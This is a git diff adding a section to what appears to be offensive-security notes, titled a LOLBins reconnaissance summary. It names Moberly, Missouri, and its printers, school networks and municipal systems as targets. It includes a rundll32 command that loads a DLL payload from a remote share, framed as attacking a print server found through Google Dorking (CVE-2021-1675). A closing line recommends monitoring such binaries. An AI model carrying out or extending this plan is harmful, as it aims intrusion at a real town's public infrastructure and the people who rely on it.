@@ -82,6 +82,31 @@ This technique uses crafted Google Dork queries to uncover unsecured or misconfi
 ---
 ## LOLbins Overveiw: 
 
+# 🛠️ LOLBINS Reconnaissance Summary  
+**Target Context:** Moberly, Missouri  
+**Objective:** Understand and utilize **LOLBins** (Living Off the Land Binaries) as part of stealthy, fileless post-exploitation strategies targeting public infrastructure—such as printers, school networks, or municipal systems—in regions like **Moberly, MO**.
+
+LOLBins are legitimate Windows binaries that come pre-installed and are often trusted by endpoint security tools. Adversaries and red teamers abuse these tools to execute malicious payloads without dropping new files, reducing detection risk. Their misuse is a cornerstone of fileless malware operations and is commonly observed in advanced persistent threat (APT) campaigns.
+
+---
+
+## 📌 Example Use Case – Moberly Print Service Target
+
+
+    rundll32.exe \\10.10.X.X\shared\payload.dll,ReflectEntry
+
+
+**Scenario:**
+After identifying an exposed printer or print server in Moberly (e.g., via Google Dorking), the attacker uses **`rundll32.exe`**—a trusted binary—to execute a DLL payload from a shared network path. This avoids writing to disk and exploits the Print Spooler service remotely if vulnerable (e.g., CVE-2021-1675).
+
+---
+
+**Note:** LOLBins like `rundll32.exe`, `regsvr32.exe`, and `powershell.exe` should be monitored in high-trust environments like public school or city IT networks, especially when they interact with remote shares or untrusted memory regions.
+
+
+```
+
+
 ## Embed and Encoded Dropper:
 
 ## HiveNightmare / Print Spooler Exploits: 
